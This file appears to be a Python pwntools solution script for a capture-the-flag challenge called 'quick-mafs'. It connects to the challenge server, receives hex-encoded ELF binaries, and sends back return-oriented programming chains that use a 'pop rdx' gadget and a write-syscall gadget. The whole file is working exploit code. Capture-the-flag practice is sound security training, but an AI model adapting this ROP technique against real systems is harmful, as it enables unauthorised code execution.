#!/usr/bin/env python
# -*- coding: utf-8 -*
from pwn import *
import binascii

context.update(arch="amd64", os="linux")
context.log_level = 'info'

p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")

for binary in range(5):
  p.recvuntil('rax = ',drop=True)
  rax = int(p.recvuntil('\n',drop=True),16)
#  instructions = p.recvline() # the server will give you instructions as to what your exploit should do
#  print(instructions)
  temp = p.recvuntil('\n',drop=True)
  elf = binascii.unhexlify(temp)
  with open("elf", "wb") as file:
    file.write(elf)

  exe = ELF('./elf')

  gadget3 = 0x000000000040122c # pop rdx ; add byte ptr [rsi + 0x2b], etc...

  # we will use this code as a gadget indeed
  '''0x000000000040179b <+12>:    mov    rsi,rsp
   0x000000000040179e <+15>:    mov    rdi,0x1
   0x00000000004017a5 <+22>:    mov    rax,0x1
   0x00000000004017ac <+29>:    syscall 
   0x00000000004017ae <+31>:    mov    rdi,0x0
   0x00000000004017b5 <+38>:    mov    rax,0x3c
   0x00000000004017bc <+45>:    syscall 
   0x00000000004017be <+47>:    nop
   0x00000000004017bf <+48>:    pop    rbp
   0x00000000004017c0 <+49>:    ret 
  '''
  # set rdx = 2
  prelude = p64(0xdeadbeef)+p64(gadget3)+p64(2) 
  prelude += p64(0x000000000040179b)
  # convert payload to hexa string and wanted value
  payload = binascii.hexlify(prelude + p16(rax))
  p.sendline(payload)
p.interactive()
